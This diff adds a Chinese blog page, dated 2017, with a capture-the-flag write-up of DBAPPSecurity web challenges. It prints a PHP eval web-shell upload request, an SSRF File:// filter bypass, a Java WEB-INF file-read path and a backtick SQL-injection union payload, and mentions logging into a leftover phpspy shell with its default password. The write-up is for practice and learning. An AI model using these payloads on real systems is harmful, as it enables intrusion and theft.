@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>安恒的一系列web | RingFall</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="forsigner,前端,设计,Hexo主题,前端开发,用户体验,设计,frontend,design,nodejs,JavaScript" />
+  
+
+  <meta name="description" content="绑定host www.mooctest.net访问即可得到flag按套路应该是改hosts文件，路径为C:\Windows\System32\drivers\etc,要用管理员身份才能修改然而这题有bug哭唧唧，，坑了窝一半时间后来是访问ip:port/index.php抓包改了host头过的 babyupload不能再简单了直接点开链接是Forbidden扫描目录（或者猜测）得到./uploa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒的一系列web">
+<meta property="og:url" content="http://ringfall.me/2017/10/25/yqxjj/index.html">
+<meta property="og:site_name" content="RingFall">
+<meta property="og:description" content="绑定host www.mooctest.net访问即可得到flag按套路应该是改hosts文件，路径为C:\Windows\System32\drivers\etc,要用管理员身份才能修改然而这题有bug哭唧唧，，坑了窝一半时间后来是访问ip:port/index.php抓包改了host头过的 babyupload不能再简单了直接点开链接是Forbidden扫描目录（或者猜测）得到./uploa">
+<meta property="og:updated_time" content="2017-10-25T15:05:13.143Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒的一系列web">
+<meta name="twitter:description" content="绑定host www.mooctest.net访问即可得到flag按套路应该是改hosts文件，路径为C:\Windows\System32\drivers\etc,要用管理员身份才能修改然而这题有bug哭唧唧，，坑了窝一半时间后来是访问ip:port/index.php抓包改了host头过的 babyupload不能再简单了直接点开链接是Forbidden扫描目录（或者猜测）得到./uploa">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-yqxjj" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">安恒的一系列web</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.10.25</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>luoluo</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://ringfall.me/2017/10/25/yqxjj/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <ul>
+<li>绑定host www.mooctest.net<br>访问即可得到flag<br><br>按套路应该是改hosts文件，路径为<code>C:\Windows\System32\drivers\etc</code>,要用管理员身份才能修改<br>然而这题有bug哭唧唧，，坑了窝一半时间<br>后来是访问<code>ip:port/index.php</code>抓包改了host头过的</li>
+<li><p>babyupload<br>不能再简单了<br><br>直接点开链接是Forbidden<br>扫描目录（或者猜测）得到./upload.php<br>发现显示<code>error:请选择上传文件</code>，但并没有发现可供上传的页面<br>此时有两种姿势<br>1.随便找个上传的题，抓个包，repeater里修改一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------323842381428372</div><div class="line">Content-Length: 432</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;dir&quot;</div><div class="line"></div><div class="line">/uploads/</div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;mm.php&quot;</div><div class="line">Content-Type: application/php</div><div class="line"></div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div><div class="line">-----------------------------323842381428372</div><div class="line">Content-Disposition: form-data; name=&quot;submit&quot;</div><div class="line"></div><div class="line">Submit</div><div class="line">-----------------------------323842381428372--</div></pre></td></tr></table></figure>
+<p>2.寄几写一个上传的html然后提交到它的页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;form action=&quot;http://114.55.36.69:46012/upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;upfile&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>此时抓包发现是这样叽哒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------13123832232625</div><div class="line">Content-Length: 220</div><div class="line">Referer: http://localhost/ti/upfile.html</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------13123832232625</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;mm.php&quot;</div><div class="line">Content-Type: application/php</div><div class="line"></div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div><div class="line">-----------------------------13123832232625--</div></pre></td></tr></table></figure>
+<p>值得注意的是，name=upfile这个是要猜的。。。<br>然后用菜刀/蚁剑链接，flag在/var/www/html下</p>
+</li>
+<li><p>curl<br>老题目，新waf,新姿势<br><br>初始链接为<code>./index.php?url=http://www.mooctest.net/</code><br>是一个php写的curl(数据传输)，可以ssrf<br>然后用file协议（用于访问本地计算机中的文件）读取源码<br>大写绕过waf<br>感觉老司机的话都是先读/etc/passwd啊什么的。。。<br><code>./index.php?url=File://index.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$url = $_GET[&apos;url&apos;];	</div><div class="line">if (preg_match(&quot;/file:[^\w]+/&quot;, $url)) exit(&quot;hacker go away!&quot;);</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;);</div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</div><div class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">$output = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line">$flag = &quot;flag&#123;xxxxxxxxxxxxxxx&#125;&quot;;</div><div class="line">print_r($output);</div></pre></td></tr></table></figure>
+</li>
+<li><p>war<br>this is a war<br><br>源码有提示：<code>&lt;!--flag就在这个页面，怎么找到源码呢 tips:tomcat部署--&gt;</code><br>结果直接名字.war就有了，解压出源码。。</p>
+</li>
+<li><p>readme2<br>java go to page<br><br>点开帮助（微笑）<br>这儿的代码具体是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;footer&gt;</div><div class="line">     &lt;div id=&quot;help&quot;&gt;帮助&lt;/div&gt;</div><div class="line">   &lt;/footer&gt;</div><div class="line">   &lt;script src=&quot;js/search.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>然后点开js/search.js是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(function()&#123;</div><div class="line">   $(&quot;#help&quot;).click(function()&#123;</div><div class="line">    location.href=&quot;show.do?page=help.jsp&quot;;</div><div class="line">   &#125;)</div><div class="line">   &#125;);</div></pre></td></tr></table></figure>
+<p>所以本瞎子是看不出这个能点开的（脸上笑嘻嘻心里mmp）<br>跳转到了<code>./test/show.do?page=help.jsp</code><br>然后搜索Java任意文件读取漏洞<br>找呀找找呀找找到惹<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23587&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">这个</a><br>进入<code>http://114.55.36.69:46015/test/show.do?page=WEB-INF/web.xml</code>查看系统配置文件<br>看到<code>index.jsp ConfigPropertie /WEB-INF/properties/configInfo.properties Index com.cn.dbapp.Index Index /show.do 500 /index.jsp 404 /index.jsp</code><br>进入<code>http://114.55.36.69:46015/test/show.do?page=/WEB-INF/properties/configInfo.properties</code>发现key</p>
+</li>
+<li>source ip<br>找到目标网站www.mooctest.net 的源ip<br>这题姿势也各种各样~要绕过cdn<br>容易想到的是用找回密码探测邮箱ip<br><code>https://jingyan.baidu.com/article/17bd8e522abb8085ab2bb8b2.html</code><br>还有就是<a href="http://xiaix.me/rao-guo-cdncha-zhao-wang-zhan-zhen-shi-ip/" target="_blank" rel="external">这个博客</a>里的姿势啦<br>在<a href="https://fofa.so/" target="_blank" rel="external">https://fofa.so/</a> 搜索title等有标志性的特征源码</li>
+<li>hackedsite<br>寻找前人的足迹<br>据嗦啊，疯狂拿字典扫出./upload/phpspy.php然后用默认密码angel登录出flag<br>注意扫目录要打开403，forbidden和not found不一样~</li>
+<li><p>babysql3<br>  注入点为id<br>  反引号闭合<br>  猜测代码为</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table where 反引$a反引=$b</div></pre></td></tr></table></figure>
+<p>  不断探测<br>  最后payload</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keyname=1&amp;name=id反引=0 union select 1,2,反引flag反引 from flag--</div></pre></td></tr></table></figure>
+<p>  构造为</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table where 反引id反引=0 union select 1,2,反引flag反引 from flag-- 反引=1</div></pre></td></tr></table></figure>
+</li>
+<li><p>snake<br>生成一个图片玩玩<br>题目地址： <a href="http://118.178.18.181:46019/" target="_blank" rel="external">http://118.178.18.181:46019/</a><br>源码地址: <a href="http://114.55.36.69:46011/src.tar" target="_blank" rel="external">http://114.55.36.69:46011/src.tar</a><br>python PIL rce</p>
+</li>
+<li><p>thinkphp5<br>跟waf正面刚！源码html.tar.gz<br>题目地址： <a href="http://114.55.91.27:46011/" target="_blank" rel="external">http://114.55.91.27:46011/</a><br>提示：<br>thinkphp5 任意文件删除<br>反序列化<br>(瑟瑟发抖，坐等小菲菲一血~)</p>
+</li>
+</ul>
+
+    
+  </div>
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/10/17/w-t-r/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://ringfall.me/2017/10/25/yqxjj/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
